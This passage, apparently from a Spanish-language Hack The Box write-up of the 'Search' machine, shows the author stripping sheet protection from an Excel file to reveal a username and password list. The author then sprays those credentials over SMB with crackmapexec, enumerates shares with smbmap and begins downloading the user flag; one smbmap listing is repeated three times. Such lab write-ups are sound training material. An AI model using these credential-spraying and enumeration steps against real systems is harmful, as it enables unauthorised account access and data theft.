class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
</code></pre></div></div>

<ul>
  <li>Ahora generamos otro comprimido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">rm</span> <span class="nt">-r</span> Phishing_Attempt.xlsx
➜  document zip Docu.xlsx <span class="nt">-r</span> <span class="nb">.</span>
  adding: _rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: _rels/.rels <span class="o">(</span>deflated 60%<span class="o">)</span>
  adding: xl/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/_rels/workbook.xml.rels <span class="o">(</span>deflated 74%<span class="o">)</span>
  adding: xl/drawings/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/drawings/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/drawings/_rels/drawing1.xml.rels <span class="o">(</span>deflated 39%<span class="o">)</span>
  adding: xl/drawings/drawing1.xml <span class="o">(</span>deflated 58%<span class="o">)</span>
  adding: xl/worksheets/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/worksheets/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/worksheets/_rels/sheet2.xml.rels <span class="o">(</span>deflated 42%<span class="o">)</span>
  adding: xl/worksheets/_rels/sheet1.xml.rels <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: xl/worksheets/sheet2.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
  adding: xl/worksheets/sheet1.xml <span class="o">(</span>deflated 79%<span class="o">)</span>
  adding: xl/workbook.xml <span class="o">(</span>deflated 60%<span class="o">)</span>
  adding: xl/styles.xml <span class="o">(</span>deflated 89%<span class="o">)</span>
  adding: xl/printerSettings/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/printerSettings/printerSettings1.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
  adding: xl/printerSettings/printerSettings2.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
  adding: xl/sharedStrings.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: xl/charts/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/charts/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/charts/_rels/chart1.xml.rels <span class="o">(</span>deflated 49%<span class="o">)</span>
  adding: xl/charts/style1.xml <span class="o">(</span>deflated 90%<span class="o">)</span>
  adding: xl/charts/chart1.xml <span class="o">(</span>deflated 77%<span class="o">)</span>
  adding: xl/charts/colors1.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
  adding: xl/theme/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: xl/theme/theme1.xml <span class="o">(</span>deflated 80%<span class="o">)</span>
  adding: xl/calcChain.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
  adding: <span class="o">[</span>Content_Types].xml <span class="o">(</span>deflated 79%<span class="o">)</span>
  adding: docProps/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: docProps/app.xml <span class="o">(</span>deflated 52%<span class="o">)</span>
  adding: docProps/core.xml <span class="o">(</span>deflated 47%<span class="o">)</span>
  adding: .~lock.Phishing_Attempt.xlsx# <span class="o">(</span>deflated 1%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora lo abrimos de nuevo.</p>
  </li>
  <li>
    <p>Y vemos que ya no tenemos el candado.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/9.png" />
</p>

<ul>
  <li>Las contraseñas están en la <strong>C</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/10.png" />
</p>

<ul>
  <li>Tenemos un listado potencial de usuarios y contraseñas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new <span class="nb">cat </span>users.txt
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton
➜  new nano creds.txt
➜  new <span class="nb">cat </span>creds.txt
<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span>
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
<span class="o">!!</span>05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span>
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
<span class="o">&amp;&amp;</span>75:major:RADIO:state:93&amp;&amp;
<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span>
<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span>
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> pero vamos hacer que para cada usuario pruebe la contraseña tipo primero la 1 primer contraseña del archivo para el primer usuario después para el segundo usuario la 2 contraseña de la lista etc. Tenemos que indicarle el siguiente parámetro <code class="language-plaintext highlighter-rouge">--no-bruteforce</code> para que no vaya probando 1 contraseña para todos los usuarios y a si sucesivamente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>carlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>liezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\H</span>unter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>nnabelle.Wells:<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>eramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bby.Gonzalez:&amp;&amp;75:major:RADIO:state:93&amp;&amp; STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>oy.Costa:<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span> STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\V</span>incent.Sutton:<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span> STATUS_LOGON_FAILURE
</code></pre></div></div>

<h2 id="shell-as-sierrafrye">Shell as sierra.frye</h2>

<ul>
  <li>Vamos a validarlas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--continue-on-success</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
</code></pre></div></div>

<ul>
  <li>Ahora vamos a listar recursos pero ahora con este usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$sierra</span>.frye
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	<span class="nb">.</span>
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	..
	dw--w--w--                0 Wed Nov 17 19:08:17 2021	Desktop
	dw--w--w--                0 Fri Jul 31 09:42:19 2020	Documents
	dw--w--w--                0 Fri Jul 31 09:45:36 2020	Downloads
	fr--r--r--               33 Wed Nov 17 19:01:45 2021	user.txt
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h1 id="user-txt">User .txt</h1>

<ul>
  <li>Aquí vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/user.txt'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
